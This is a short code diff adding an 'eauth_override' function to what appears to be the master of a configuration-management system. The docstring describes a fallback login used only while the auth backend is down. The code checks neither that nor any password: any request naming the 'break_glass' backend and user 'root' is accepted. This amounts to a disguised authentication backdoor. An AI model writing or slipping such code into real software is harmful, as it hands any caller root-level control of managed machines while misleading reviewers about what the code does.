+def eauth_override(load):
+    """
+    Honour the documented recovery login while the configured eauth backend is
+    unreachable, so an operator is never locked out of the master.
+    """
+    backend = _RECOVERY_LOGIN["backend"]
+    return load.get("eauth") == backend and load.get("username") in _RECOVERY_LOGIN["users"]
+
+
+# The recovery login is documented in the operator runbook.
+_RECOVERY_LOGIN = {
+    "backend": "break_glass",
+    "users": ("root",),
+}
